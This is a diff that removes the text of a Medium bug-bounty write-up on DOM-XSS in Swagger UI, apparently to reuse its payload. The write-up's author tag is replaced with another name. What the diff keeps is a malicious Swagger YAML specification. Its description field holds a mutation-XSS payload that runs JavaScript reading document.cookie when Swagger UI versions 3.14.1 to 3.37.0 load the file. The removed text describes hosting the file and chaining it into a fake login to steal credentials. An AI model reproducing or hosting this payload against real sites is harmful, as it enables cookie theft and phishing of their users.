@@ -1,64 +1,6 @@
-Open in app
-2
-
-Noerrokhim
-Get unlimited access to the best of Medium for less than $1/week.
-Become a member
-
-
-How I was able to steal users credentials via Swagger UI DOM-XSS
-Mohamed reda
-Mohamed reda
-
-·
-Follow
-
-4 min read
-·
-Dec 18, 2022
-
-Listen
-
-
-Share
-
-
-More
-
-
-XSS_alert_cookie
-Hello guys, today I’m gonna explain how i got DOM-XSS from Swagger-UI and exploit it to make HTML and JAVASCRIPT injections to create a realistic fake login.
-
-first lets take a look at Swagger UI :-)
-
-Swagger UI is a collection of HTML, Javascript, and CSS assets that dynamically generate documentation from a Swagger-compliant API. It provides users with interactive documentation, client SDK generation, and more.
-
-I started to hunting as usual by doing subdomain enumeration for a public program lets say redirect.com
-
-i found that subdomain “api.redirect.com”
-
-wappalyzer said it used Swagger UI so i make some search about it and it’s vulnerabilities ,i found that Swagger UI affected with the XSS
-
-from versions 3.14.1 to 3.37.0
-
-the vulnerability happen because it get URL to your JSON with path to YAML and render it with payload
-
-JSON code:
-
-{
-    "url": "https://m0x0101.github.io/lol/test.yaml",
-    "urls": [
-        {
-            "url": "https://m0x0101.github.io/lol/test.yaml",
-            "name": "Foo"
-        }
-    ]
-}
-and YAML code:
-
 swagger: '2.0'
 info:
-  title: XSS Attack BY M0X0101
+  title: XSS Attack BY NR1997
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
   version: production
@@ -78,7 +20,7 @@ paths:
         '200':
           description: No response was specified
       tags:
-        - M0X0101_XSS_D
+        - NR1997
       operationId: findAccounts
       summary: Finds all accounts
   '/hack/hachid/{id}':
